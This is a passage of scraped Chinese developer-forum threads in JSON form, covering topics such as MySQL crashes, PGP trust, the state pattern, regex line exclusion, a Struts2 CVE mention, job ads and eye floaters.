"你居然有女朋友？！", " 说的太对了。。 都女朋友了，还别人，楼主女朋友肯定眼瞎了", "原来大家都差不多 ，手动捂脸🤦‍♂️", "可以理解，一般这种行为的心理是偏向理性主义，生怕因为感情蒙蔽事实。因为男女朋友这种关系这么特殊，你首先反应就是千万不能因为这种关系而盲目站队，也害怕别人风言风语。只要注意一下沟通的语气就好了，多站在别人角度考虑没什么不好，但也不要太刻意，太刻意就会变成很”装“的那种人。", "努力锻炼 情商~~   认知是一回事~ 做又是另外一回事情~"]},
{"content": "", "reply": "1", "tittle": "今天给 CVE-2017-5638 刷屏了", "comment": ["据我所知。。。好多公司貌似还用 struct2 很老很老的版本，早期的漏洞根本没人理。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如何用 C 实现输出的信息作为用户的下一次输入,类似就是 Mysql-Cli 里，你按 Up-Arrow 键，可以得到上一条 sql ，并且你可以对这个 sql 做修改。</p>\n</div></div>"], "reply": "3", "tittle": "用 C 实现输出的信息作为用户的下一次输入", "comment": ["这不是终端已经有的功能了吗？\r", "\r", "建一个用户输入的 history, 监听 up-arrow 事件", "libreadline / libedit", "readline"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是日志信息，之前也修改过内存参数，但是好像不管用。。。\n数据库大神们帮看看～～～\n170302 12:43:16 mysqld_safe Number of processes running now: 0</p>\n<p>170302 12:43:20 mysqld_safe mysqld restarted</p>\n<p>170302 12:44:52 [Note] /usr/libexec/mysqld (mysqld 5.5.44-MariaDB) starting as process 20806 ...</p>\n<p>170302 12:45:37 InnoDB: The InnoDB memory heap is disabled</p>\n<p>170302 12:45:38 InnoDB: Mutexes and rw_locks use GCC atomic builtins</p>\n<p>170302 12:45:39 InnoDB: Compressed tables use zlib 1.2.7</p>\n<p>170302 12:45:39 InnoDB: Using Linux native AIO</p>\n<p>170302 12:45:52 InnoDB: Initializing buffer pool, size = 128.0M</p>\n<p>170302 12:45:58 InnoDB: Completed initialization of buffer pool</p>\n<p>170302 12:46:51 mysqld_safe mysqld from pid file /var/run/mariadb/mariadb.pid ended</p>\n</div></div>"], "reply": "10", "tittle": "apache 服务器网站，每隔一段时间后， mysql 就自动挂了，需要手动启动 mysql，一段时间又。。。", "comment": ["你这正常启动日志能看啥", "内存不够了吧", "看 coredump ，没有 coredump 就开启 coredump 再说。", " 应该是内存的问题，我在优化一些参数试试吧！！", "看到题目第一时间想到 OOM ，去看下系统日志吧", "一般单机 mysql 挂，都是因为内存不够", "内存", "建议给 mysql 加个日志，多半是内存问题。\r", "之前有同事遇到过类似的问题，原因是代码有问题。\r", "其中有个查询会导致内存溢出，每次执行到那段代码 mysql 就会挂掉。", " 唉，一个水平低下的程序员，能累死 SA ， my.cnf 无论怎么折腾也解决不了问题。。。", " InnoDB 被我关了，应该好了，过些日子看看还挂不。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://sp.xingkeba.com/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E7%A6%8F%E5%88%A9%E7%BD%91%E5%9D%80\" rel=\"nofollow\">http://sp.xingkeba.com/分享一个福利网址</a>\r<br>很多类似网站提供免费的会员视频 vip 解析服务，速度很快，不知道背后实现的原理是什么。</div>"], "reply": "13", "tittle": "优酷、腾讯、爱奇艺 VIP 视频免费解析原理", "comment": ["用服务器获取移动版页面视频源，将 cdn 上的源文件地址保存。定期更新即可", "h5 的视频", "有就自己看，分享出来很快就被封了", "维护起来很困难的，一般都是一些安全策略被泄漏才暴露了源地址，而这些安全策略时常会发生改变的。", " 但是抓包发现转到的视频地址也分段的视频流，并不是完整的视频", "要看不如自己下载", "m3u8,流媒体", " 上次坐高铁前想看看鬼吹灯，无奈会员还是缓冲不了，就去类似这种网站把他的分段视频下下来然后手动合并，最后还没用到，看白夜行去了，==、", "晕死，这东西太牛 B 了，不用买什么会员了！对了，播放时怎么全屏呀？不想下载后再看。", "404  not found", "谢谢分享，确实很牛啊。", " @", "  ", " 这是所有的 vip 视频解析接口，有全屏的", "我发现不管什么福利，只要一发布到这个论坛，基本上就要完蛋了！这贴出来时，那些解析引擎都还正常的，今天再去试，结果没一个能用的了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>方法一：直接存储</h2>\n<p>table_article:</p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/86e073c4gy1fd8t2528omj213s0f8dh7\"></p>\n<p>每篇文章都设置了一张头图，看起来好像没什么问题。现在有了另一个需求，每篇文章要添加一张尾图，那么如何做呢？</p>\n<h2>方法二：间接存储</h2>\n<p>文章不存储相关图片</p>\n<p>table_article</p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/86e073c4gy1fd8t4rako5j213k08ojrs\"></p>\n<p>这是图片表，图片存储在这，其中 imageable_id 表示存储相关表记录 ID 。例如在这个例子中， ID 为 3 的文章里需要一张头图，那图片表里的 imageable_id 存储的就是 3 ，通过 type 来确定图片的其他属性。</p>\n<p>table_images</p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/86e073c4gy1fd8t5djvkyj213i0jmjta\"></p>\n<p>其中 imageable_id 显然是可以重复的，例如某篇文章和某件商品的 ID 都是 2 。但这里有个问题，如果两种图片类型都是 header image 呢？</p>\n<p>全文请参考：<a href=\"http://goldenera.me/2017/02/28/%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E5%9B%BE%E7%89%87%E8%A1%A8/\" rel=\"nofollow\">如何设计图片表</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "图片表设计的两种思路", "comment": []},
{"content": ["<div class=\"topic_content\">目前手头上有一个 类 BBS 的产品要上线，只缺对帖子的内容进行过滤这一块，请各位推荐一下你们认为优秀的方案，不甚感激😄</div>"], "reply": "8", "tittle": "求推荐成型的文本过滤方案", "comment": ["str.replace(\"你妈\", \"我妈\")", " 66666666666 老司机", "网易易盾？", "体验过易盾 感觉不错", " 呵呵", " #3\r", " #4\r", "易盾充值金额 20K 起，事业单位这么多钱不容易批复", " 给大家科普一下 3DM 论坛的文本过滤方案，只需要 PHP 在后台一句 str_replace('你妈','我妈',$post_content);即可，详情效果请参见： ", " #1\r", " @", "\r", "看到两位的回复，我的心颤了一下"]},
{"content": ["<div class=\"topic_content\">如题，才六百六七十，心里没底啊</div>"], "reply": "25", "tittle": "马云家的 ThinkPad 定制款 tumi 手提包是不是真的？", "comment": ["很难看，不喜欢。", "随意放个低调的手提包\r", "LOEWE Goya Embossed Leather Briefcase", "不要问真假，只问能不能用", "我也觉得奇怪，这个牌子又丑又贵，然而几乎是很多程序员标配……欺负直男么", "贪便宜还是别惦记 tumi 了", " 嗯", " 有同感", " 太低调了壕", " 嗯", " 有没有推荐的品牌", "  程序猿标配难道不是瑞士军刀 （#看我头像）", " 666666", "这个价位应该是假的 tumi", "其实真的也不咋样.. 自己美国海淘过一个..... 虽然现在天天再用....  但是那个拉链 居然雕漆... 太 low 了....  传说中的质量好.. 反正拉链头子质量绝对不怎么样....  别买了....", "真的，原来只有 300 块左右，这还是涨起来了", "tumi 真的很丑，无法理解买这个的人的思路，买个 coach 也行啊", " 我那个 coach 单肩的背带背两个月断了，现在用的小米的双肩", "六七十块的联想电脑包就挺好。", "背了好多年的 Jansport 双肩电脑包, 塞了个 15 吋的 VAIO S15 毫无压力, 甚至还能顺便带上散热器, 充电器, 插线板, 数位板, 4TB 的桌面硬盘, 就是有点沉. 长途就拉个派利肯的风暴箱, 很耐艹", " \r", "用了很久迪士尼的电脑包，拉链还带米奇哦。", "应该是真的，但真的好丑.....", "淘宝搜了一下，，真是蛮丑的。。一边直角一边圆的设计是为了逼死强迫症么..", "大爱 tumi ，我就是这么 low", "英雄不问出处"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>广告 Time ！</p>\n<p>2017 机器学习技术大会系列直播！</p>\n<p>主题：机器学习的理论基础</p>\n<p>时间： 3 月 2 日（明晚）晚 8 点</p>\n<p>特邀嘉宾：汪进，惠普资深人工智能专家</p>\n<p>直播报名链接： <a href=\"http://boolan.com/\" rel=\"nofollow\">http://boolan.com/</a></p>\n<p>直播结束后，群内还将送出 5 本机器学习相关书籍~</p>\n</div></div>", "<div class=\"topic_content\">今晚， 8 点~</div>", "<div class=\"topic_content\">3 月 9 日，下周四，还有直播哟~</div>"], "reply": "14", "tittle": "机器学习系列直播", "comment": ["3 月 2 号，是今晚 8 点。", " 对哈，多谢提醒~", "666", "> 直播结束后，群内还将送出 5 本机器学习相关书籍~\r", "说的是什么群呀？", " 晚上的直播群呐~", "666", "好卡。直接公布群号多好 网站打不开", " 额，网站居然打不开……微信群么有群号呐~\r", "你阔以搜“博览网”哈", "有讲座的提纲么", " 晚上参加一下，就知道讲什么啦~", "看个直播，报名要填写 ：姓名，联系电话，邮箱，公司，职位\r", "\r", "真累...", " 后面还有直播的话，好通知你啊~", " 那还需要公司和职位？", " 这不尽量防止那些想发广告的进群嘛，不然干扰大家参加直播交流，多不好~"]},
{"content": "", "reply": "12", "tittle": "GnuPG、PGP、OPENPGP、Web of trust 绕了半天，还是没明白不用 PKI 和 CA， PGP 是如何保证公钥交换过程中不被篡改的？它的意思是公钥传输是一次性的，和加密通信是一般是相互独立的过程，所以不用担心？", "comment": ["PGP 不保证\r", "公钥首先从公网取得， PGP 假设你能和好基友见面并验证身份，然后你的好基友再和好基友见面，你的好基友还可以给别人签名。最后理论上能间接验证所有人。也就是说他假设你整个关系网都在用 PGP 。\r", "这就是为啥 gpg 没流行", "保证公钥交换过程中不被篡改的方式是线下拿着彼此的有效身份证件交换公钥；所以 WoT 事实上保证的是公钥和上面声称的身份的对应关系，至于你个人有没有足够的能力保证私钥安全，甚至说直接拿着高仿身份证件参与接头而对方无力识破，那就没办法了\r", "\r", "理论上多节点互相验证形成网状结构之后可以降低这种风险，所以有人会设置某个公钥有超过 X 个自己（直接或有条件地间接）信任的公钥签名后才受到信任，或者类似的权重计算模型", "需要用政府发行的可靠证件来确认身份。", "PGP 的特性确保了即使公钥被篡改也无法欺骗和盗取信息。\r", "但没有技术手段去验证公钥的真实性，简单来说 PGP 解决的是熟人之间的通讯安全。", "不存在什么公钥交换吧，我只用过 GPG ，它是要把自己的公钥提交到公共的服务器上。通过邮件的方式验证公钥的真实性。以后别人可以到服务器上查询另一个人的公钥。", "lz 需要注意的一点是：\r", "公钥传输多少次都不会影响安全性\r", "私钥绝对不允许传输\r", "\r", "PGP 模型需要（人、 public key fingerprint ）当面验证", " \r", "\r", "我的表述有些问题。\r", "\r", "在 PKI 体系下，证书实际就是在传输公钥，假如证书被中间人替换掉你觉的会不会影响安全？这一点也是我问题的出发点。\r", "\r", "通过仔细阅读 wikipedia 英文相关条目，还是可以基本理解 PGP 的原理及不足之处。它的确比中心化的 CA 证书体系更有优势（直接端到端的加密），但可能也更麻烦（用户自己管理公私钥）。公钥交换的确是独立的过程（通过各种 PGP 客户端来维护密钥，相互签名来认证公钥等）。\r", "\r", " 问题是你考虑的这个问题不存在……传输的内容是被 CA 签名过的", " X.509 证书当然是签名过的。这和伪造一个同样签名过的证书又没有冲突，而且实际上某机构就这样干过。\r", "自签名的证书可以达到同样效果，只要你信任它。\r", "\r", "可以看看 mitmproxy 的证书原理：\r", " \r", "> X.509 证书当然是签名过的。这和伪造一个同样签名过的证书又没有冲突，而且实际上某机构就这样干过。 \r", "PKI 的基础就是要认为 CA 可信，都到 CA 伪造签名了这就没得玩了啊\r", "\r", "你可以认为 WoT 模型里面每个人都是自己的 CA, 然后一堆人互相交叉签名\r", "\r", "PKI 里面认证的模式以最常见的域名证书为例是验证你控制了这个域名的 web 服务器或者 DNS 解析或者管理员邮箱， WoT 里面常见的认证模式是验证你拥有和公钥上标记匹配的现实身份", " 如果 CA 会随便签发证书而不付出任何代价，那这个体系确实就崩了。你既然都理解，还问什么呢？", "我想一种安全体系大概是考虑各种因素后形成的折中方案，但这并影响另一群程序员想要实现更安全的、更不受控制的方案的理想。 PGP 的初衷应该就是这样吧。\r", "\r", "另一方面，我一直觉得作为程序员应该能站在一个更高的视角思考问题，因为你在指挥着一堆符号、一堆 api 、协调着大量的计算资源，让他们按照你的理性逻辑，去实现复杂的功能，没有这种全局性和哲学思维方式，只能陷入一种 bug 满天飞的、到处补漏的境况。\r", "\r", "人们已经认识到智能只能通过学习获得，我们还是更细心的去理解别人所说的每一句话、更谦虚的学习吧。"]},
{"content": ["<div class=\"topic_content\">关注这个项目，应该会让那些对性能研究感兴趣的同学，有点收获： <a target=\"_blank\" href=\"https://github.com/barretlee/performance-column/issues\" rel=\"nofollow\">https://github.com/barretlee/performance-column/issues</a>\r<br>\r<br>我将会投入 2-3 个月的业余时间跟项目成员互动。</div>"], "reply": "25", "tittle": "性能研究专栏小组，欢迎旁观", "comment": ["666 ， star 走一波，比较喜欢", "围观围观！", "标题。性功……   我承认我眼瞎了", " 眼神不错~", "我觉得如果是性功能研究小组 我会报名。。。", " 更上一层楼么。😄", "看成了性研究所", "同楼上，看成性研究所😂", "看来大家都发现当 MD 程序员是最好的选择", "有兴趣，不过小密圈是啥。。", "   多解锁几个姿势。", "666", "性能力研究专业小姐?\r", "\r", "视力越来越差,脑补越来越强....", "好像偏前端的多？有适用于后端的么？", "这标题有点 6666666666", "表示关注！！！", "star+1", "这个标题……\r", "1. 撸多了很容易眼花看错\r", "2. 后端猿表示不服", "有没得后端。哈哈", "我要报名我要报名\r", "什么。。。。不是性研究所啊", "“能”字看掉了。。。", "可爱的话题", "star && watch :)", "居然还可以这么玩。。", " 我也看成  性 能"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>是这样，老外客户有个需求，想要 Tab + T 做些事情，然后今天我看了下， JS 好像只能 Alt + XX or Ctrl + XX 这样子的，所以我想问问各位大佬，有没有什么诡异的法子去实现这个呢？？</p>\n</div></div>"], "reply": "8", "tittle": "关于一个 JS 组合键的问题~~~~", "comment": ["……不是有 keydown 和 keyup 事件么，注意处理一下各种情况应该还好。", " 今天下午我在网上看到这个思路了，但是一直没实现，刚看到你的回复，又静下心想了一下，解决了。谢谢！果然一个人安安静静的会比较好思考些，下午在公司吵吵闹闹的感觉脑子就没动起来过。 V2EX 什么时候加个 emoji ，我想 /亲亲 层主。", "想起来我写过一个这样的小插件： ", " 我大致看了下，如果我想 A + B 干些事情的话，你可能不能实现啊！", " 例子里不是有吗？ 这个小东西就是为实现组合键而写的", " 但是你只能实现 Ctrl 、 Shift 仅有的几个，不能实现任意键，比如我说的 Tab + T", " ctrl 、 shift 、 alt 、 command 等等加任意键都是可以的，并不是只有例子那几个组合啊兄弟，唯独 Tab 我没做处理，也就一行代码的事。写着玩的而已。", "\r", "\r", "按照上面的代码，随时读取 window.keysOnHold 就行"]},
{"content": ["<div class=\"topic_content\">![]( <a target=\"_blank\" href=\"http://p1.bqimg.com/567571/61a619009daaefa8.jpg\" rel=\"nofollow\">http://p1.bqimg.com/567571/61a619009daaefa8.jpg</a>)\r<br>我理解的状态模式会把 if else 里的具体逻辑通过状态对象抽象出来，如果有一个场景是读配置文件中的一个值，根据值做不同的逻辑，如果可取的值有 5 个，那么状态模式一定可以减少 if else 的数量吗？</div>", "<div class=\"topic_content\">歪楼了，我的重点在状态模式！</div>"], "reply": "14", "tittle": "通过状态模式减少 if else", "comment": ["count = 1\r", "if xxxx:\r", "  count += 1\r", "if xxxx:\r", "  count += 1\r", "\r", "if count != 2:\r", "  return False", "map: {\r", "\"state1\": func1,\r", "\"state2\": func2,\r", "\"state3\": func3,\r", "\"state4\": func4,\r", "\"state5\": func5,\r", "}\r", "\r", "processState(state) {\r", "func = map[state]\r", "func()\r", "}\r", "\r", "完全没有 if/else", " 您这剑走偏锋，没毛病😂", " 这一点也不偏。。。。", "Use a lookup table like @", " 但是直接用数组，访问时会性能更快\r", "\r", "var map = [null, func1, func2, func3, func4, func5];", "说主题，这里的 if-return 其实不会提高性能\r", "看起来是少了 if-else ，可也别把编译器当傻子，编译器早就知道优化这种情况了。\r", "if-return 的用法主要是用在输入验证的时候，可以 if (illegal) return error ，在要验证的内容很多的情况下，可以有效减少嵌套层数，提高代码可读性。和性能没半毛钱关系。\r", "\r", "另外这种情况 C/C++代码用的比较多。\r", "Python 里面楼上用函数表就是标准做法，一点也不偏，这就是状态模式的一种表达法。如果平时用状态模式考虑问题，这种表达是很自然的。你必须理解一点：程序也是数据。\r", "C 里面用函数指针也可以实现，不知道为啥不多见。可能因为过程语言本身的习惯，以及函数指针没用起来那么方便。毕竟 C 里面还要自己处理越界，不能依赖 runtime 检查。\r", "\r", "\r", " 解释型语言就别纠结这种零碎性能了，谁知道 runtime 开销多大。可维护性最重要。不是所有判断条件都是整数的。比如写个 HTTP 后端，完全可以直接用字符串做 method 的选择。", " C 程序之所以减少使用函数指针，我想可能因为是从寄存器跳转的分支预测率是较其它低的。", "void branch_1(){ do_something(); }\r", "void branch_2(){ do_some_other_thing(); }\r", "void (*selection[])() = { branch_1, branch_2 };\r", "// ...\r", "bool condition = a > b;\r", "(*selection[condition])();\r", "\r", "听说不要用 if ？", " hashtable 的方式看着其实跟 switch 很像呀\r", "switch(state): { \r", "case \"state1\": func1, \r", "case \"state2\": func2, \r", "case \"state3\": func3, \r", "case \"state4\": func4, \r", "case \"state5\": func5, \r", "} \r", "有 O(1)和 O(n)的差别，当然维护性上看， table 方式会好一点，但具体逻辑抽象成 func1,func2 后，感觉也没那么大了呀\r", "如果判断条件是整数，字符串也行， switch 本质上只是写法不一样，还是要挨个遍历没减少 if else, table 的方式说减少 if else 能是能接受，总感觉怪。我刚看设计模式，感觉状态模式就是那几个 func1 ， func2 的抽象，你总是要根据一个判断条件来确定是哪个 func ，可能我有点钻代码上一代要减少 if else 这个牛角尖了...", " 不是 O(n) ", "\r", "你要明白 dict 是带索引结构的，所以可以快\r", "要避免多层嵌套 if ，否则代码看都看不清。对 Python 尤为重要，毕竟不是所有人都身上带着游标卡尺的。\r", "还是那句话， if 判断从性能上来讲是无法消除的，但可以消除多层嵌套，提高代码可读性。\r", "另外，我说可以直接用 string 是这种：\r", "if method==“ GET ”: do_get ()\r", "elif method==\"POST\" do_post()\r", "……\r", "这种用 dict 最合适", " 状态模式用适合实现那些可以用状态机简单描述的算法", "简单的说，使用查表法实现有限状态机。", "状态模式是为了解决复杂对象的描述困难的吧，可以减少条件分支。楼主的需求应该是策略模式吧，是无法消灭条件分支的。"]},
{"content": ["<div class=\"topic_content\">需求：\r<br>有如下文本，需要找出不含“ hede “的行, 不要告诉我用 grep -v ，我要纯正则表达式。\r<br>hoho\r<br>hihi\r<br>haha\r<br>hede</div>", "<div class=\"topic_content\">这个问题的出处是我在用阿里的日志服务时发现它们的正则表达式只能取出要的行，没法剔除指定的行。开了工单，客服也没提出什么实际的解决方案，我以为他们的系统就这样了。\r<br>写复杂的排除正则也是没办法的办法。\r<br>\r<br>结果戏剧性的结果来了，我开了个脑洞，把他们的过滤配置里的 key 前加了个！，结果就达到我的目的了。\r<br>顺便回了个工单，告诉他们这个功能， 2333333.\r<br>\r<br>我只能暗暗佩服自己的机智🐶</div>"], "reply": "29", "tittle": "考验一下你的正则功力", "comment": ["目前搜到离答案最近的是\r", "\r", "但悲剧的是我自己用\r", "grep '^((?!hede).)*$' b.txt\r", "居然没用。", " egrep ？？", "Easy, ", " Updated, h([^e])h\\1 will do the work.\r", "\r", "考验功力上这个啊", "^(?!.*hede.*).*$", "5 楼那个网站已经把正则玩出花了，不怕虐的可以去试一下", "Use `grep -P pattern`.", "6 楼应该是最准确直观的答案了吧", " 的答案是我第一感觉的答案，楼主，下一题吧。", "^(?!.*hede).*$", " afoot|catfoot|dogfoot|fanfoot|foody|foolery|foolish|fooster|footage|foothot|footle|footpad|footway|hotfoot|jawfoot|mafoo|nonfood|padfoot|prefool|sfoot|unfool", " 这个分数是越低越好?", "/^(?!.*hede).*$/gi", " 哟，我们的答案好像是一样的", "且慢点赞。\r", "\r", " 我拿你的正则来跑测试没过。\r", "\r", "grep '^(?!.*hede.*).*$' b.txt \r", "\r", "b.txt 里是我的那几行 string 。\r", "你是怎么跑过的？", " foo 不就行了吗。。。", " egrep 貌似没有用，普通的 grep 是支持正则的。", " #16 \r", "grep -P", " 233333\r", "你真机灵，可惜这种解法不具备通用性，字符串随机一点你就没辙了。", "js  \r", "/(^|\\n)((?:(?!hede).)+)(?=\\n|$)/g\r", "\r", "..其他的 支持 后断言 的\r", "\r", "/(?<=^|\\n)(?:(?!hede).)+(?=\\n|$)/g", " 好吧，我的是 mac ，没有-P 这个选项。", "LZ 可能是想要一个 ABAB 叠字的正则", "  不是，我只是想要个通用的能够过滤掉某些行的方案，用纯正则表达式", " 在 linux 下成功了。", "感谢版上的 V 友热心支招。特别感谢 @", " 的解答。这个问题是由于阿里日志服务的一个坑引发的。\r", "正则功力几乎为 0 ，每次都是用的时候不断尝试，或者直接问同事", "`hoho \r", "hihi \r", "haha \r", "fahedewwf`.replace(/\\n.*hede.*\\n?/g, '\\n')", " #5 这个网站好玩"]},
{"content": ["<div class=\"topic_content\">在当前的 APP 应用市场中，随着 APP 数量的增加，和应用商店入口的不断几种，单个 APP 应用想要获得用户的难度越来越大，而且单个用户的获得成本也越来越高。\r<br>\r<br>曾经，一款 App 通过市场首发能获得大量用户，而现在通过首发获取的用户数量却是一降再降。在这种激烈竞争的 APP 应用市场前提下，更多人采取不断尝试开拓新的渠道资源，引进新的入口流量，如地铁媒体、线下传单、公交车身等。线上也有前些时候风靡全国的价格战、口水战。但是线上线下新渠道的开拓成本不菲，让 APP 的推广陷入了两难的境地。\r<br>\r<br>如果把获取用户的来源用入口来形容，把用户流失的因素做为出口。很多企业在 APP 的推广过程中把 80%的精力集中在用户入口的引入。比如一个公司的推广人员可能很多，而专门负责发现 App 问题的却很少，亦或少数客服、售后可以发现 APP 问题，也无法引起重视。但是很多人不知道，出口问题能让你的 App 丢失更多的用户。\r<br>\r<br>对一款 App 来说，除了安装卸载适配问题之外，还有更多的问题，比如启动时间太长、响应太慢、太占用手机内存、手机流量耗用太快、影响电量消耗等性能问题，这些问题也会影响你的用户。其中应用的十大问题如连接超时、闪退、卡顿、崩溃、黑白屏、网络劫持、交互性能差、 CPU 使用率问题、内存泄露、不良接口等十大性能问题，这些问题会让你的用户流失的严重。\r<br>\r<br>TestBird 做过千千万万 APP 测试，有些问题只是添加一小段代码就能解决的，却会导致各种安装卸载失败、应用崩溃等。众多 APP 斥资巨大引来的流量就因为这些问题白白流失，造成巨大损失。\r<br>\r<br>通过技术手段解决 App 的质量本身的问题，还是非常容易的。这些技术手段可以间接的提高 App 的质量，从而堵住了用户的出口损失，挽回了用户。如果加上入口流量的引入，减少出口的流量损失，无形之中增加了 App 的用户量。\r<br>\r<br>当 App 用户大量流失的时候，真正问题是质量问题导致的。在 App 的质量问题中，安装卸载是第一步，安装卸载的问题会影响 App 的转化率。一个 App 在应用市场的下载量代表着这个 App 被下载的次数，但是这个次数还不等于激活数。在下载后，有大部分的用户可能因为安装问题使得 App 没有被安装上，如果一个软件的下载转化率超过 50%的话，那已经是非常好的成绩了。而实际情况中，很多质量问题导致了 App 的转化率只有 30%以下甚至更低，再加上后期的运行问题导致的用户流失，一个 App 要想推广至千万用户，基本是难上加难。\r<br>而在 TestBird 做一个小小的兼容性测试，就能了解覆盖市面上所有主流手机的安装卸载状况，性能状况等。 APP 用户也不会因为这类质量问题而造成巨大流失了。</div>"], "reply": "2", "tittle": "APP 用户留存难？质量管理是关键", "comment": ["能够解决到用户问题才是关键吧", "所以, 这是个软文"]},
{"content": ["<div class=\"topic_content\">预览地址： <a target=\"_blank\" href=\"https://vincar.cn/\" rel=\"nofollow\">https://vincar.cn/</a>\r<br>车型数据暂只到 2016 年 12 月。</div>"], "reply": "5", "tittle": "做了一个使用 VIN 码/车架号查询车辆信息的网站 ", "comment": ["怎么显示到首页去呢？", "楼主做汽车相关的？在某个车联网公司？", " 在一个小公司，我们做汽配的一个交易平台， ", "手上有套域名 qipeiyi  com/cn 想出手··不知道贵公司有兴趣不", "话说 VIN 查车型这些不都是公开数据么…"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位 V 友好，</p>\n<pre><code> 支付宝财富事业群，三月份需要找 40 个左右的 java 开发、过了 3 月份财年结束， HC 就没有了，想换工作的同学们抓住机会😯；研发的产品是余额宝、招财宝、蚂蚁聚宝、基金等互联网金融产品；具体要求 java 工作三年以上，技术越牛越好；待遇啥的只要你够牛，薪水、股票都等着您哈。\n 工作地点 杭州、上海(3 月 21 号搬到上海中心大夏)\n 简历发送给bolink9527@163.com 内推 面试一次流程搞定\n \n 小伙伴们，我们需要你。\n</code></pre>\n</div></div>"], "reply": "12", "tittle": "支付宝招聘 Java 攻城狮", "comment": ["40 个？这么多", "  是的  要在 3 月底完成招聘，过了三月份就冻结招聘名额了；", "有兴趣的可以发简历给我(bolink9527@163.com)，直接内推的，是本部门招人；做的产品是余额宝、招财宝、蚂蚁聚宝、基金；有技术、有业务总有一款适合你的，小伙伴们，简历砸过来吧。 java 3 年及以上", " 整个公司冻结？", "  不是整个公司，是这次我们大部门招聘冻结了", "你好，请问招实习生么？", "  招的  2018 毕业的，但是最好是 985 的研究生，其他的大学也可以试试", " 3 年以上的学历啥的要求呢", "这是要在下一个财报之前补充编制呀，准备上市了？", "  学历大专或者本科 或以上都行的", "刚刚面阿里挂了的飘过。。。\r", "\r", "之前看过一个阿里的 Java 面试总结，各位兄弟，只能帮你到这里了-->\r", "应届招吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>眼睛每天盯着屏幕太久，飞蚊症比较严重，一致觉得电脑显示屏散发的蓝光对眼睛肯定有很大的伤害作用，市面上的蓝光眼镜感觉噱头大于实质，另外，中国人都认可一种看不见但伤害非常大的东西：辐射。这东西感觉对眼睛也有比较大的伤害，曾经想买个电子墨水屏来写代码肯定对眼睛好，但是逛了逛，技术相当不成熟，刷新率太低了。今天突发奇想，不买专业的那种大投影仪，就买个普通的微型投影仪，显示尺寸比 50 寸大就行了，这样人可以坐在客厅沙发上远一点，投影仪的光我感觉应该和日光灯或者普通的白炽灯一样对眼睛没太大的伤害吧？这样理解对不？有这么干的 V 友没？</p>\n</div></div>"], "reply": "78", "tittle": "飞蚊症严重，买个微型投影仪来写代码会不会对眼睛好点？", "comment": ["你要用沙普爱思！", "理解的没错，但是我也不觉得用显示屏会有任何问题。", "投影仪对光线环境要求太高，如果用投影仪要看的清，只能在黑暗中写代码了", "我也越来越严重了。。", "我想了想。\r", "\r", "是不是你的头有倾前的习惯？\r", "因为这样头向前倾向的情况下，血液会有所阻碍，头脑没有血液循环会导致眼睛会有……各种各样的幻觉。", "高度近视一直有，现在已经看淡了。。。", "用投影仪，估计需要环境亮度适当低于投影亮度，这样子的话，如楼上所说，在黑暗环境下写代码，瞎得更快。", "建议老老实实去医院检查看看吧", "快去医院检查", "有没有这样的可能性:\r", "自己把眼睛蒙上，然后学着像盲人一样使用电脑。练习一段时间，熟练到一定程度之后，应该就很爽了吧。\r", "如果可行，这大概是使用电脑时最有效的护眼方式了。", "最近都是怎么了, 有考虑 电视写代码的 有考虑 投影仪的, 是不是很快就要尝试在电影院方案了...想想要是能在 IMAX 上面开个 Vim, 那样的逼格..\r", "话说回来, 老老实实用显示器, 并且去医院检查一下到底什么地方出问题了, 遵医嘱...\r", "其实我也一直想要有 墨水瓶写代码的方案,一直觉得 kindle 屏视觉上更稳定一些, 甚至尝试过 kindle 魔改, 但是一个是屏幕太小, 第二是分辨率太低, 要是有 1080p 的 25 寸墨水瓶方案就好了", "好几年了  也没真正关注这个", " 好像现在有墨水屏显示器了，之前新闻有说过", " 好像索尼是有这么大的墨水屏。\r", "是的，没错，去看看吧。\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "如果我没记错，好像 5K 块。", "投影仪延迟感人吧", "全球首款电子墨水 PC 显示器面世\r", "投影仪色彩非常差...慎用...", "弄个大显示器坐远一点，淘宝上有家卖防辐射屏的还不错挂一个", " 并没有什么用，只要眼底没有问题就没法治疗。。。", "看淡吧，多闭眼休息， IDE 编辑器主题用深色也就看不见了。接受它吧。", "智子来干扰你了", "辐射？现在还有人信这个？", "投影仪更不行", " 我也觉得 而且还是程序员= =。", "去医院检查吧，别想着辐射了。。", "是不是该擦眼镜了\r", "我想起来 擦下眼镜，突然就换了个世界。", "我看淡了，高中就有， 13 年左眼视网膜脱落，幸好手术及时。 做这一行 且码且珍惜", " 那么严重", "小学才几年级的时候，双眼近视就五十度，从此老老实实健康用眼，说句老实话，再好的外设都是浮云\r", "正确的坐姿，多运动，多喝水，每一个小时都活动一下肩、背、腰、手很重要\r", "现在码了四年，身体比身边的人都好，近视还是五十度\r", "\r", "每次听到身边的人买人工学椅、键盘、坐垫、屏幕等，我不反对，但是都会这么提醒一下", "GUNNAR 眼镜一幅也许能缓解这情况", "不会。楼主还是不要过度注意，要刻意忽视飞蚊症，这问题现在没啥特别好的方法治疗，如何要治疗，据说可以使用类似玻璃体置换填充等手术（貌似是用针扎眼睛里，把浑浊的抽出来，再注射置换物）\r", " 莎普爱思不治疗玻璃体浑浊，郎平做广告的也不行。", "先了解一下飞蚊症的成因吧（ ", " ）（就是里面有混浊物而已……）跟什么蓝光辐射搭不着边，近视加深引起眼底改变是个物理过程啊，不要长时间看近处物体加深疲劳是真的，玻璃体会更容易出现各种奇奇怪怪的东西让你看到", "辐射这个说法应是伪科学，毕竟屏幕不会产生电离辐射，其他辐射强度也不大。蓝光我就不得而知了。\r", 